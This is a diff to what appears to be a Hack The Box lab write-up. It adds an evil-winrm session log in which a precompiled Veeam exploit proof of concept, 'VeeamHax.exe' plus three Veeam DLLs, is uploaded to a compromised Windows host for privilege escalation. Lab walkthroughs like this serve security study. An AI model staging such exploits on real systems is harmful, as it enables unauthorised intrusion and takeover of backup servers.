@@ -415,5 +415,21 @@ There is also a POC i found with pre compiled binaries to save me compiling it m
 Making an assumption i think ill need the .exe and the three .dll files from the repo
 
 ```python
-
+evil-winrm-py PS C:\exploit> upload VeeamHax.exe .
+Uploading /home/kali/htb/jobtwo/VeeamHax.exe 7.00k/7.00k [00:00<00:00, 13.9kB/s]
+[+] File uploaded successfully as: C:\exploit\VeeamHax.exe
+evil-winrm-py PS C:\exploit> upload Veeam.Backup.Common.dll .
+Uploading /home/kali/htb/jobtwo/Veeam.Backup.Common.dll: 1.81MB [00:03, 570kB/s]                                                                                                                                     
+[+] File uploaded successfully as: C:\exploit\Veeam.Backup.Common.dll
+evil-winrm-py PS C:\exploit> upload Veeam.Backup.Interaction.MountService.dll .
+Uploading /home/kali/htb/jobtwo/Veeam.Backup.Interaction.MountService.dll: 448kB [00:00, 578kB/s]                                                                                                                    
+[+] File uploaded successfully as: C:\exploit\Veeam.Backup.Interaction.MountService.dll
+evil-winrm-py PS C:\exploit> upload Veeam.Backup.Model.dll .
+Uploading /home/kali/htb/jobtwo/Veeam.Backup.Model.dll: 4.25MB [00:08, 539kB/s]                                                                                                                                      
+[+] File uploaded successfully as: C:\exploit\Veeam.Backup.Model.dll
+evil-winrm-py PS C:\exploit>
 ```
+
+Ill upload all 
+
+
